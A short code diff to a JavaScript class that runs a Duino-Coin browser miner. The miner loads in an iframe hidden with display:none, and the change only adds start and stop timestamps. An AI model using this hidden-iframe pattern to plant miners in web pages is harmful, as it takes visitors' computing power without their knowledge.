@@ -6,7 +6,9 @@ export class Duco {
         this.rigid = options.rigid || 'duco.js';
         this.key = options.key || '';
         this.id = options.id || ('duco-js-' + String(Math.random().toString(36).slice(2, 12)));
-        this.timestamp = new Date();
+        this.createdTimestamp = new Date();
+        this.startedTimestamp = null;
+        this.stoppedTimestamp = null;
         this.running = false;
         this.changed = false;
         this.url = `https://server.duinocoin.com/webminer.html?username=${this.username}&threads=${this.threads}&rigid=${this.rigid}&keyinput=${this.key}`;
@@ -19,6 +21,7 @@ export class Duco {
         iframe.style.cssText = 'display:none;';
         document.body.append(iframe);
         this.running = true;
+        this.startedTimestamp = new Date();
     }
 
     startAfter(time) {
@@ -30,6 +33,7 @@ export class Duco {
     stop() {
         document.querySelectorAll(`#${this.id}`).forEach(e=>e.remove());
         this.running = false;
+        this.stoppedTimestamp = new Date();
     }
 
     stopAfter(time) {
